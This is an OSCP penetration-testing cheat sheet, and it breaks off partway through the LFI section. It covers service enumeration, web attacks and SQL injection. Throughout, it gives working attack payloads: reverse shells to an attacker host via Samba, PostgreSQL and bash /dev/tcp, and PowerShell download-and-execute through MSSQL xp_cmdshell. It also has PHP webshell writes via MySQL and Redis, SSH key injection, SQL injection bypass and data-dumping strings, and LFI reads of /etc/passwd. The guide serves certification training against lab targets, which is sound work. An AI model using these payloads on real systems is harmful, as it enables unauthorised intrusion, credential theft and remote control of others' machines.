# OSCP Examination Reference Guide  
 
## Table of Contents  
 
1. [Enumeration](#enumeration)  
 
2. [Web Application Attacks](#web-application-attacks)  
 
3. [SQL Injection](#sql-injection)  
 
4. [Local File Inclusion (LFI) / Remote File Inclusion (RFI)](#local-file-inclusion-lfi--remote-file-inclusion-rfi)  
 
5. [File Upload Vulnerabilities](#file-upload-vulnerabilities)  
 
6. [Password Attacks](#password-attacks)  
 
7. [Reverse Shells](#reverse-shells)  
 
8. [Shell Stabilization](#shell-stabilization)  
 
9. [Linux Privilege Escalation](#linux-privilege-escalation)  
 
10. [Windows Privilege Escalation](#windows-privilege-escalation)  
 
11. [Active Directory Attacks](#active-directory-attacks)  
 
12. [Pivoting and Tunneling](#pivoting-and-tunneling)  
 
13. [Buffer Overflow](#buffer-overflow)  
 
14. [File Transfers](#file-transfers)  
 
15. [Useful Commands and One-Liners](#useful-commands-and-one-liners)  
 
16. [Exam Strategy and Tips](#exam-strategy-and-tips)  
 
---  
 
## Enumeration  
 
### Network Scanning with Nmap  
 
#### Initial Fast Scan  
 
```bash
 
# Quick TCP scan to identify open ports  
 
nmap -sC -sV -oA nmap/initial 10.10.10.x  
 
# Comprehensive scan with aggressive options  
 
nmap -sC -sV -O -A -T4 -oA nmap/full 10.10.10.x  
 
# Scan all TCP ports  
 
nmap -p- -T4 -oA nmap/allports 10.10.10.x  
 
# Scan specific ports found in all-ports scan with scripts  
 
nmap -sC -sV -p 22,80,443,8080 -oA nmap/targeted 10.10.10.x  
 
```
 
#### UDP Scanning  
 
```bash
 
# Top 100 UDP ports (faster)  
 
nmap -sU --top-ports 100 -oA nmap/udp 10.10.10.x  
 
# Full UDP scan (very slow)  
 
nmap -sU -p- -T4 -oA nmap/udp-full 10.10.10.x  
 
# Common UDP ports to check  
 
nmap -sU -p 53,67,68,69,123,137,138,139,161,162,500,514,520,631,1434,1900,4500,5353 10.10.10.x  
 
```
 
#### Nmap NSE Scripts  
 
```bash
 
# List available scripts for a service  
 
ls -la /usr/share/nmap/scripts/ | grep -i "smb"  
 
ls -la /usr/share/nmap/scripts/ | grep -i "http"  
 
# Run vulnerability scripts  
 
nmap --script vuln -p 80,443 10.10.10.x  
 
# Run safe scripts  
 
nmap --script safe -p 80 10.10.10.x  
 
# Specific script usage  
 
nmap --script http-enum -p 80 10.10.10.x  
 
nmap --script smb-vuln* -p 445 10.10.10.x  
 
nmap --script ssl-heartbleed -p 443 10.10.10.x  
 
```
 
#### Host Discovery  
 
```bash
 
# Ping sweep  
 
nmap -sn [10.10.10.0/24](http://10.10.10.0/24) -oG hosts.txt  
 
grep "Up" hosts.txt | cut -d " " -f 2 > live_hosts.txt  
 
# ARP scan (same subnet)  
 
arp-scan -l  
 
netdiscover -r [10.10.10.0/24](http://10.10.10.0/24)  
 
# When ICMP is blocked  
 
nmap -Pn -p 80,443,445 [10.10.10.0/24](http://10.10.10.0/24)  
 
```
 
#### Alternative Port Scanners  
 
```bash
 
# Masscan (fastest for large ranges)  
 
masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0 -oL masscan.txt  
 
# Rustscan (fast with nmap integration)  
 
rustscan -a 10.10.10.x --ulimit 5000 -- -sC -sV  
 
# Extract ports from masscan  
 
cat masscan.txt | grep "open" | cut -d " " -f 4 | cut -d "/" -f 1 | sort -n | tr '\n' ',' | sed 's/,$//'  
 
```
 
---  
 
### Service Enumeration  
 
#### FTP (Port 21)  
 
```bash
 
# Check for anonymous login  
 
ftp 10.10.10.x  
 
> anonymous  
 
> anonymous  
 
# Nmap scripts  
 
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -p 21 10.10.10.x  
 
# Download all files  
 
wget -r --no-passive ftp://anonymous:anonymous@10.10.10.x/  
 
# Upload a file  
 
ftp> binary  
 
ftp> put shell.php  
 
# Common FTP vulnerabilities  
 
# - vsftpd 2.3.4 backdoor (CVE-2011-2523)  
 
# - ProFTPD 1.3.3c backdoor  
 
# - ProFTPD mod_copy (CVE-2015-3306)  
 
```
 
#### SSH (Port 22)  
 
```bash
 
# Version detection  
 
nc -nv 10.10.10.x 22  
 
ssh -v user@10.10.10.x  
 
# Nmap scripts  
 
nmap --script ssh-brute,ssh-auth-methods,ssh-hostkey -p 22 10.10.10.x  
 
# Using SSH with specific key  
 
chmod 600 id_rsa  
 
ssh -i id_rsa user@10.10.10.x  
 
# SSH with legacy algorithms (older systems)  
 
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa user@10.10.10.x  
 
ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa -i id_rsa user@10.10.10.x  
 
# SSH key cracking  
 
ssh2john id_rsa > id_rsa.hash  
 
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash  
 
# Generate SSH key pair for persistence  
 
ssh-keygen -t rsa -b 4096 -f key  
 
echo "$(cat key.pub)" >> ~/.ssh/authorized_keys  
 
```
 
#### DNS (Port 53)  
 
```bash
 
# Zone transfer  
 
dig axfr @10.10.10.x domain.htb  
 
host -l domain.htb 10.10.10.x  
 
dnsrecon -d domain.htb -t axfr -n 10.10.10.x  
 
# DNS enumeration  
 
dnsenum domain.htb  
 
fierce --domain domain.htb --dns-servers 10.10.10.x  
 
# Reverse lookup  
 
dig -x 10.10.10.x @10.10.10.x  
 
# DNS subdomain bruteforce  
 
gobuster dns -d domain.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r 10.10.10.x:53  
 
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "[http://domain.htb](http://domain.htb)" -H "Host: FUZZ.domain.htb" --hw 0  
 
# Add to /etc/hosts  
 
echo "10.10.10.x domain.htb subdomain.domain.htb" | sudo tee -a /etc/hosts  
 
```
 
#### SMTP (Port 25/465/587)  
 
```bash
 
# Connect and enumerate  
 
nc -nv 10.10.10.x 25  
 
telnet 10.10.10.x 25  
 
# User enumeration  
 
VRFY root  
 
EXPN admin  
 
RCPT TO:admin  
 
# Nmap scripts  
 
nmap --script smtp-commands,smtp-enum-users,smtp-ntlm-info,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.10.10.x  
 
# smtp-user-enum  
 
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.x  
 
# Send email  
 
swaks --to victim@domain.htb --from attacker@domain.htb --server 10.10.10.x --body "test"  
 
```
 
#### POP3/IMAP (Port 110/143/993/995)  
 
```bash
 
# Connect to POP3  
 
nc -nv 10.10.10.x 110  
 
telnet 10.10.10.x 110  
 
# POP3 commands  
 
USER admin  
 
PASS password  
 
LIST  
 
RETR 1  
 
# Connect to IMAP  
 
nc -nv 10.10.10.x 143  
 
# IMAP commands  
 
a1 LOGIN admin password  
 
a2 LIST "" "*"  
 
a3 SELECT INBOX  
 
a4 FETCH 1 body[text]  
 
# Nmap scripts  
 
nmap --script pop3-capabilities,pop3-ntlm-info -p 110 10.10.10.x  
 
nmap --script imap-capabilities,imap-ntlm-info -p 143 10.10.10.x  
 
```
 
#### RPC/NFS (Port 111/2049)  
 
```bash
 
# RPC enumeration  
 
rpcinfo -p 10.10.10.x  
 
rpcclient -U "" -N 10.10.10.x  
 
# NFS enumeration  
 
showmount -e 10.10.10.x  
 
nmap --script nfs-ls,nfs-showmount,nfs-statfs -p 111,2049 10.10.10.x  
 
# Mount NFS share  
 
mkdir /mnt/nfs  
 
mount -t nfs 10.10.10.x:/share /mnt/nfs -o nolock  
 
mount -t nfs -o vers=2 10.10.10.x:/share /mnt/nfs  
 
# NFS privilege escalation (no_root_squash)  
 
# If no_root_squash is enabled, create SUID binary  
 
cat /etc/exports # On target  
 
cp /bin/bash /mnt/nfs/bash  
 
chmod +s /mnt/nfs/bash  
 
# On target: /share/bash -p  
 
```
 
#### SMB (Port 139/445)  
 
```bash
 
# Check SMB version  
 
nmap --script smb-protocols -p 445 10.10.10.x  
 
# Anonymous enumeration  
 
smbclient -L //10.10.10.x -N  
 
smbclient //10.10.10.x/share -N  
 
# With credentials  
 
smbclient -L //10.10.10.x -U 'user%password'  
 
smbclient //10.10.10.x/share -U 'user%password'  
 
# smbmap enumeration  
 
smbmap -H 10.10.10.x  
 
smbmap -H 10.10.10.x -u '' -p ''  
 
smbmap -H 10.10.10.x -u 'user' -p 'password'  
 
smbmap -H 10.10.10.x -u 'user' -p 'password' -r share  
 
smbmap -H 10.10.10.x -u 'user' -p 'password' --download "share\file.txt"  
 
# CrackMapExec  
 
crackmapexec smb 10.10.10.x -u '' -p '' --shares  
 
crackmapexec smb 10.10.10.x -u 'user' -p 'password' --shares  
 
crackmapexec smb 10.10.10.x -u users.txt -p passwords.txt --continue-on-success  
 
# enum4linux  
 
enum4linux -a 10.10.10.x  
 
enum4linux-ng -A 10.10.10.x  
 
# rpcclient  
 
rpcclient -U "" -N 10.10.10.x  
 
rpcclient> enumdomusers  
 
rpcclient> enumdomgroups  
 
rpcclient> queryuser 0x1f4  
 
rpcclient> querygroupmem 0x200  
 
rpcclient> lookupsids S-1-5-21-xxx-xxx-xxx-500  
 
# Nmap scripts  
 
nmap --script smb-enum-shares,smb-enum-users,smb-ls,smb-vuln* -p 139,445 10.10.10.x  
 
# Mount SMB share  
 
mount -t cifs //10.10.10.x/share /mnt/smb -o username=user,password=pass  
 
mount -t cifs //10.10.10.x/share /mnt/smb -o username=user,password=pass,vers=1.0  
 
# Download all files recursively  
 
smbget -R smb://10.10.10.x/share -U user%password  
 
```
 
**Common SMB Vulnerabilities:**  
 
```bash
 
# EternalBlue (MS17-010) - Windows 7/2008 R2  
 
nmap --script smb-vuln-ms17-010 -p 445 10.10.10.x  
 
# Exploit: [https://github.com/worawit/MS17-010](https://github.com/worawit/MS17-010)  
 
# SambaCry (CVE-2017-7494) - Samba 3.5.0-4.5.4  
 
# Requires writable share  
 
# Exploit: [https://github.com/opsxcq/exploit-CVE-2017-7494](https://github.com/opsxcq/exploit-CVE-2017-7494)  
 
# Samba username map script (CVE-2007-2447) - Samba 3.0.20-3.0.25rc3  
 
# Exploit through smbclient  
 
smbclient //10.10.10.x/tmp  
 
logon "/=`nohup nc -e /bin/sh ATTACKER_IP 4444`"  
 
```
 
#### SNMP (Port 161/162 UDP)  
 
```bash
 
# Enumerate with public community string  
 
snmpwalk -c public -v1 10.10.10.x  
 
snmpwalk -c public -v2c 10.10.10.x  
 
# Enumerate specific OIDs  
 
# System processes  
 
snmpwalk -c public -v1 10.10.10.x 1.3.6.1.2.1.25.4.2.1.2  
 
# Running software  
 
snmpwalk -c public -v1 10.10.10.x 1.3.6.1.2.1.25.6.3.1.2  
 
# User accounts  
 
snmpwalk -c public -v1 10.10.10.x 1.3.6.1.4.1.77.1.2.25  
 
# TCP connections  
 
snmpwalk -c public -v1 10.10.10.x 1.3.6.1.2.1.6.13.1.3  
 
# snmp-check  
 
snmp-check 10.10.10.x -c public  
 
# Brute force community strings  
 
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.10.x  
 
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.10.x snmp  
 
# Nmap scripts  
 
nmap -sU --script snmp-brute,snmp-info,snmp-interfaces,snmp-processes -p 161 10.10.10.x  
 
```
 
#### LDAP (Port 389/636/3268/3269)  
 
```bash
 
# Enumerate LDAP  
 
ldapsearch -x -H ldap://10.10.10.x -b "dc=domain,dc=htb"  
 
ldapsearch -x -H ldap://10.10.10.x -b "dc=domain,dc=htb" "(objectClass=user)"  
 
ldapsearch -x -H ldap://10.10.10.x -b "dc=domain,dc=htb" "(objectClass=computer)"  

nmap -n -sV -Pn -script "ldap* and not brute" IP
# With credentials  
 
ldapsearch -x -H ldap://10.10.10.x -D "user@domain.htb" -w 'password' -b "dc=domain,dc=htb"  
 
# Get base DN  
 
ldapsearch -x -H ldap://10.10.10.x -s base namingcontexts  
 
# Nmap scripts  
 
nmap --script ldap-rootdse,ldap-search -p 389 10.10.10.x  
 
# ldapdomaindump  
 
ldapdomaindump -u 'domain\user' -p 'password' 10.10.10.x  
 
```
 
#### MSSQL (Port 1433)  
 
```bash
 
# Connect with impacket  
 
impacket-mssqlclient user:password@10.10.10.x  
 
impacket-mssqlclient domain/user:password@10.10.10.x -windows-auth  
 
# Enable xp_cmdshell  
 
SQL> EXEC sp_configure 'show advanced options', 1;  
 
SQL> RECONFIGURE;  
 
SQL> EXEC sp_configure 'xp_cmdshell', 1;  
 
SQL> RECONFIGURE;  
 
# Command execution  
 
SQL> EXEC xp_cmdshell 'whoami';  
 
SQL> EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''[http://10.10.14.x/shell.ps1''](http://10.10.14.x/shell.ps1''))"';  
 
# Read files  
 
SQL> SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;  
 
# Linked servers  
 
SQL> EXEC sp_linkedservers;  
 
SQL> EXEC ('xp_cmdshell ''whoami''') AT [linked_server];  
 
# Nmap scripts  
 
nmap --script ms-sql-info,ms-sql-config,ms-sql-empty-password,ms-sql-ntlm-info -p 1433 10.10.10.x  
 
```
 
#### MySQL (Port 3306)  
 
```bash
 
# Connect  
 
mysql -h 10.10.10.x -u root -p  
 
mysql -h 10.10.10.x -u root  
 
# Enumeration commands  
 
SHOW DATABASES;  
 
USE database_name;  
 
SHOW TABLES;  
 
SELECT * FROM users;  
 
SELECT user,password FROM mysql.user;  
 
# File operations (requires FILE privilege)  
 
SELECT LOAD_FILE('/etc/passwd');  
 
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';  
 
# Nmap scripts  
 
nmap --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 -p 3306 10.10.10.x  
 
# UDF privilege escalation  
 
# [https://www.exploit-db.com/exploits/1518](https://www.exploit-db.com/exploits/1518)  
 
```
 
#### PostgreSQL (Port 5432)  
 
```bash
 
# Connect  
 
psql -h 10.10.10.x -U postgres -d postgres  
 
# Enumeration  
 
\list # List databases  
 
\c database_name # Connect to database  
 
\dt # List tables  
 
\du # List users  
 
SELECT * FROM users;  
 
# File operations  
 
COPY (SELECT '') TO PROGRAM 'id';  
 
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.x/4444 0>&1"';  
 
# Read files  
 
CREATE TABLE demo(t text);  
 
COPY demo FROM '/etc/passwd';  
 
SELECT * FROM demo;  
 
```
 
#### Redis (Port 6379)  
 
```bash
 
# Connect  
 
redis-cli -h 10.10.10.x  
 
# Enumeration  
 
INFO  
 
CONFIG GET *  
 
KEYS *  
 
GET key_name  
 
# SSH key injection  
 
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt  
 
cat key.txt | redis-cli -h 10.10.10.x -x set crackit  
 
redis-cli -h 10.10.10.x  
 
> CONFIG SET dir /home/user/.ssh/  
 
> CONFIG SET dbfilename "authorized_keys"  
 
> SAVE  
 
# Webshell upload  
 
redis-cli -h 10.10.10.x  
 
> CONFIG SET dir /var/www/html/  
 
> CONFIG SET dbfilename "shell.php"  
 
> SET test "<?php system($_GET['cmd']); ?>"  
 
> SAVE  
 
```
 
#### RDP (Port 3389)  
 
```bash
 
# Nmap enumeration  
 
nmap --script rdp-enum-encryption,rdp-ntlm-info -p 3389 10.10.10.x  
 
# Connect with rdesktop  
 
rdesktop -u user -p password 10.10.10.x  
 
# Connect with xfreerdp  
 
xfreerdp /u:user /p:password /v:10.10.10.x  
 
xfreerdp /u:user /p:password /v:10.10.10.x /cert:ignore /drive:share,/tmp  
 
# Pass the hash  
 
xfreerdp /u:administrator /pth:NTLM_HASH /v:10.10.10.x  
 
# BlueKeep check (CVE-2019-0708)  
 
nmap --script rdp-vuln-ms12-020 -p 3389 10.10.10.x  
 
```
 
#### WinRM (Port 5985/5986)  
 
```bash
 
# Check if WinRM is enabled  
 
nmap -p 5985,5986 10.10.10.x  
 
# Connect with evil-winrm  
 
evil-winrm -i 10.10.10.x -u user -p password  
 
evil-winrm -i 10.10.10.x -u user -H NTLM_HASH  
 
# CrackMapExec  
 
crackmapexec winrm 10.10.10.x -u user -p password  
 
crackmapexec winrm 10.10.10.x -u user -p password -x "whoami"  
 
```
 
---  
 
## Web Application Attacks  
 
### Directory and File Enumeration  
 
#### Gobuster  
 
```bash
 
# Directory bruteforce  
 
gobuster dir -u [http://10.10.10.x](http://10.10.10.x) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50  
 
# With file extensions  
 
gobuster dir -u [http://10.10.10.x](http://10.10.10.x) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,old,asp,aspx -t 50  
 
# Ignore SSL errors  
 
gobuster dir -u [https://10.10.10.x](https://10.10.10.x) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k  
 
# With cookies/headers  
 
gobuster dir -u [http://10.10.10.x](http://10.10.10.x) -w wordlist.txt -c "session=abc123" -H "Authorization: Bearer token"  
 
# Virtual host enumeration  
 
gobuster vhost -u [http://domain.htb](http://domain.htb) -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  
 
# DNS subdomain bruteforce  
 
gobuster dns -d domain.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r 10.10.10.x:53  
 
```
 
#### Feroxbuster  
 
```bash
 
# Recursive directory bruteforce  
 
feroxbuster -u [http://10.10.10.x](http://10.10.10.x) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
 
# With extensions and depth limit  
 
feroxbuster -u [http://10.10.10.x](http://10.10.10.x) -w wordlist.txt -x php,txt,html -d 3  
 
# With status code filtering  
 
feroxbuster -u [http://10.10.10.x](http://10.10.10.x) -w wordlist.txt -C 404,403,500  
 
```
 
#### FFuf  
 
```bash
 
# Directory bruteforce  
 
ffuf -u [http://10.10.10.x/FUZZ](http://10.10.10.x/FUZZ) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
 
# With extensions  
 
ffuf -u [http://10.10.10.x/FUZZ](http://10.10.10.x/FUZZ) -w wordlist.txt -e .php,.txt,.html  
 
# Virtual host enumeration  
 
ffuf -u [http://10.10.10.x](http://10.10.10.x) -H "Host: FUZZ.domain.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 1234  
 
# Parameter fuzzing  
 
ffuf -u [http://10.10.10.x/page.php?FUZZ=value](http://10.10.10.x/page.php?FUZZ=value) -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt  
 
# POST data fuzzing  
 
ffuf -u [http://10.10.10.x/login](http://10.10.10.x/login) -X POST -d "username=admin&password=FUZZ" -w passwords.txt -fc 401  
 
```
 
#### Wfuzz  
 
```bash
 
# Directory bruteforce  
 
wfuzz -c -z file,wordlist.txt --hc 404 [http://10.10.10.x/FUZZ](http://10.10.10.x/FUZZ)  
 
# Hide responses by word/char/line count  
 
wfuzz -c -z file,wordlist.txt --hw 50 [http://10.10.10.x/FUZZ](http://10.10.10.x/FUZZ)  
 
wfuzz -c -z file,wordlist.txt --hh 1234 [http://10.10.10.x/FUZZ](http://10.10.10.x/FUZZ)  
 
# Parameter fuzzing  
 
wfuzz -c -z file,wordlist.txt --hc 404 [http://10.10.10.x/page.php?param=FUZZ](http://10.10.10.x/page.php?param=FUZZ)  
 
# POST fuzzing  
 
wfuzz -c -z file,wordlist.txt -d "user=FUZZ&pass=pass" --hc 200 [http://10.10.10.x/login](http://10.10.10.x/login)  
 
# Multiple payloads  
 
wfuzz -c -z file,users.txt -z file,passwords.txt -d "user=FUZZ&pass=FUZ2Z" [http://10.10.10.x/login](http://10.10.10.x/login)  
 
```
 
### Web Application Reconnaissance  
 
#### Nikto  
 
```bash
 
nikto -h [http://10.10.10.x](http://10.10.10.x)  
 
nikto -h [https://10.10.10.x](https://10.10.10.x) -ssl  
 
nikto -h [http://10.10.10.x](http://10.10.10.x) -output nikto_results.txt  
 
```
 
#### WhatWeb  
 
```bash
 
whatweb [http://10.10.10.x](http://10.10.10.x)  
 
whatweb -a 3 [http://10.10.10.x](http://10.10.10.x) # Aggressive mode  
 
```
 
#### Wappalyzer (Browser Extension)  
 
- Identifies technologies used by websites  
 
### WordPress Enumeration  
 
```bash
 
# WPScan enumeration  
 
wpscan --url [http://10.10.10.x](http://10.10.10.x) -e u,vp,vt,tt,cb,dbe --api-token YOUR_API_TOKEN  
 
# User enumeration  
 
wpscan --url [http://10.10.10.x](http://10.10.10.x) -e u  
 
# Plugin enumeration  
 
wpscan --url [http://10.10.10.x](http://10.10.10.x) -e ap --plugins-detection aggressive  
 
# Password bruteforce  
 
wpscan --url [http://10.10.10.x](http://10.10.10.x) -U users.txt -P /usr/share/wordlists/rockyou.txt  
 
# Common vulnerable plugins  
 
# - mail-masta (LFI)  
 
# - wp-file-manager (RCE)  
 
# - social-warfare (RCE)  
 
# - duplicator (arbitrary file read)  
 
# WordPress configuration file  
 
/var/www/html/wp-config.php  
 
```
 
### Drupal Enumeration  
 
```bash
 
# Droopescan  
 
droopescan scan drupal -u [http://10.10.10.x](http://10.10.10.x)  
 
# Common vulnerabilities  
 
# Drupalgeddon2 (CVE-2018-7600) - Drupal < 7.58 / 8.x < 8.3.9 / 8.4.x < 8.4.6 / 8.5.x < 8.5.1  
 
# Drupalgeddon3 (CVE-2018-7602)  
 
# Configuration files  
 
/sites/default/settings.php  
 
```
 
### Joomla Enumeration  
 
```bash
 
# JoomScan  
 
joomscan -u [http://10.10.10.x](http://10.10.10.x)  
 
# Configuration file  
 
/configuration.php  
 
```
 
### Manual Web Testing Checklist  
 
```markdown
 
1. View page source code  
 
2. Check robots.txt, sitemap.xml  
 
3. Check .htaccess, .htpasswd  
 
4. View SSL certificate (for hostnames)  
 
5. Check HTTP response headers  
 
6. Test for default credentials  
 
7. Test for SQL injection  
 
8. Test for XSS  
 
9. Test for LFI/RFI  
 
10. Test for command injection  
 
11. Check for API endpoints  
 
12. Check for WebDAV  
 
13. Test file upload functionality  
 
14. Check for version disclosure  
 
15. Test for SSRF  
 
16. Test for IDOR  
 
```
 
---  
 
## SQL Injection  
 
### Detection  
 
```sql
 
-- Basic detection payloads  
 
'  
 
"  
 
`  
 
')  
 
")  
 
`)  
 
'))  
 
"))  
 
`))  
 
' OR '1'='1  
 
' OR '1'='1'--  
 
' OR '1'='1'#  
 
' OR '1'='1'/*  
 
admin'--  
 
admin' #  
 
admin'/*  
 
' OR 1=1--  
 
' OR 1=1#  
 
```
 
### Authentication Bypass  
 
```sql
 
' OR '1'='1  
 
' OR '1'='1'--  
 
' OR '1'='1'#  
 
admin'--  
 
admin' OR '1'='1'--  
 
admin' OR 1=1--  
 
admin' OR 1=1#  
 
admin'/*  
 
admin' OR '1'='1'/*  
 
') OR ('1'='1'--  
 
') OR ('1'='1'/*  
 
' OR 1=1 LIMIT 1--  
 
' OR 1=1 LIMIT 0,1--  
 
```
 
### UNION-Based SQLi  
 
#### Step 1: Find Number of Columns  
 
```sql
 
' ORDER BY 1--  
 
' ORDER BY 2--  
 
' ORDER BY 3--  
 
-- Continue until error  
 
' UNION SELECT NULL--  
 
' UNION SELECT NULL,NULL--  
 
' UNION SELECT NULL,NULL,NULL--  
 
-- Continue until successful  
 
```
 
#### Step 2: Find Displayable Columns  
 
```sql
 
' UNION SELECT 'a',NULL,NULL--  
 
' UNION SELECT NULL,'a',NULL--  
 
' UNION SELECT NULL,NULL,'a'--  
 
```
 
#### Step 3: Extract Data  
 
```sql
 
-- MySQL  
 
' UNION SELECT @@version,NULL,NULL--  
 
' UNION SELECT user(),NULL,NULL--  
 
' UNION SELECT database(),NULL,NULL--  
 
-- List databases  
 
' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata--  
 
' UNION SELECT group_concat(schema_name),NULL,NULL FROM information_schema.schemata--  
 
-- List tables  
 
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='database_name'--  
 
' UNION SELECT group_concat(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()--  
 
-- List columns  
 
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--  
 
-- Extract data  
 
' UNION SELECT username,password,NULL FROM users--  
 
' UNION SELECT group_concat(username,':',password),NULL,NULL FROM users--  
 
-- Read files (MySQL)  
 
' UNION SELECT load_file('/etc/passwd'),NULL,NULL--  
 
-- Write files (MySQL)  
 
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'--  
 
```
 
### Error-Based SQLi  
 
#### MySQL  
 
```sql
 
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--  
 
' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--  
 
' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT user()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--  
 
```
 
#### MSSQL  
 
```sql
 
' AND 1=convert(int,(SELECT @@version))--  
 
' AND 1=convert(int,(SELECT user_name()))--  
 
```
 
### Blind SQLi (Boolean-Based)  
 
```sql
 
-- MySQL  
 
' AND 1=1-- (returns normal)  
 
' AND 1=2-- (returns different)  
 
-- Extract database name character by character  
 
' AND (SELECT SUBSTRING(database(),1,1))='a'--  
 
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--  
 
-- Binary search approach  
 
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>64--  
 
```
 
### Blind SQLi (Time-Based)  
 
```sql
 
-- MySQL  
 
' AND SLEEP(5)--  
 
' AND IF(1=1,SLEEP(5),0)--  
 
' AND IF((SELECT SUBSTRING(database(),1,1))='a',SLEEP(5),0)--  
 
-- MSSQL  
 
'; WAITFOR DELAY '0:0:5'--  
 
'; IF (1=1) WAITFOR DELAY '0:0:5'--  
 
-- PostgreSQL  
 
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--  
 
-- Oracle  
 
' AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE NULL END FROM dual)--  
 
```
 
### MSSQL Specific  
 
```sql
 
-- Enable xp_cmdshell  
 
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--  
 
-- Command execution  
 
'; EXEC xp_cmdshell 'whoami';--  
 
'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''[http://10.10.14.x/shell.ps1''](http://10.10.14.x/shell.ps1''))"';--  
 
-- Stacked queries  
 
'; INSERT INTO users VALUES('hacker','password');--  
 
```
 
### SQLMap  
 
```bash
 
# Basic usage  
 
sqlmap -u "[http://10.10.10.x/page.php?id=1](http://10.10.10.x/page.php?id=1)"  
 
# POST request  
 
sqlmap -u "[http://10.10.10.x/login.php](http://10.10.10.x/login.php)" --data="user=admin&pass=admin"  
 
# With cookies  
 
sqlmap -u "[http://10.10.10.x/page.php?id=1](http://10.10.10.x/page.php?id=1)" --cookie="session=abc123"  
 
# From Burp request file  
 
sqlmap -r request.txt  
 
# Enumerate databases  
 
sqlmap -u "[http://10.10.10.x/page.php?id=1](http://10.10.10.x/page.php?id=1)" --dbs  
 
# Enumerate tables  
 
sqlmap -u "[http://10.10.10.x/page.php?id=1](http://10.10.10.x/page.php?id=1)" -D database_name --tables  
 
# Enumerate columns  
 
sqlmap -u "[http://10.10.10.x/page.php?id=1](http://10.10.10.x/page.php?id=1)" -D database_name -T table_name --columns  
 
# Dump data  
 
sqlmap -u "[http://10.10.10.x/page.php?id=1](http://10.10.10.x/page.php?id=1)" -D database_name -T table_name -C column1,column2 --dump  
 
# OS shell  
 
sqlmap -u "[http://10.10.10.x/page.php?id=1](http://10.10.10.x/page.php?id=1)" --os-shell  
 
# SQL shell  
 
sqlmap -u "[http://10.10.10.x/page.php?id=1](http://10.10.10.x/page.php?id=1)" --sql-shell  
 
# File read  
 
sqlmap -u "[http://10.10.10.x/page.php?id=1](http://10.10.10.x/page.php?id=1)" --file-read="/etc/passwd"  
 
# File write  
 
sqlmap -u "[http://10.10.10.x/page.php?id=1](http://10.10.10.x/page.php?id=1)" --file-write="shell.php" --file-dest="/var/www/html/shell.php"  
 
# Bypass WAF  
 
sqlmap -u "[http://10.10.10.x/page.php?id=1](http://10.10.10.x/page.php?id=1)" --tamper=space2comment,between  
 
```
 
---  
 
## Local File Inclusion (LFI) / Remote File Inclusion (RFI)  
 
### Basic LFI  
 
```bash
 
# Linux  
 
[http://10.10.10.x/page.php?file=/etc/passwd](http://10.10.10.x/page.php?file=/etc/passwd)  
 
[http://10.10.10.x/page.php?file=../../../etc/passwd](http://10.10.10.x/page.php?file=../../../etc/passwd)  
 
[http://10.10.10.x/page.php?file=....//....//....//etc/passwd](http://10.10.10.x/page.php?file=....//....//....//etc/passwd)  
 
[http://10.10.10.x/page.php?file=..%2f..%2f..%2fetc%2fpasswd](http://10.10.10.x/page.php?file=..%2f..%2f..%2fetc%2fpasswd)  
 
# Windows  
 
[http://10.10.10.x/page.php?file=C](http://10.10.10.x/page.php?file=C):\Windows\System32\drivers\etc\hosts  
 
[http://10.10.10.x/page.php?file=.](http://10.10.10.x/page.php?file=.).\..\..\..\Windows\System32\drivers\etc\hosts  
 
```
 
### Bypass Techniques  
 
```bash
 
# Null byte (PHP < 5.3.4)  
 
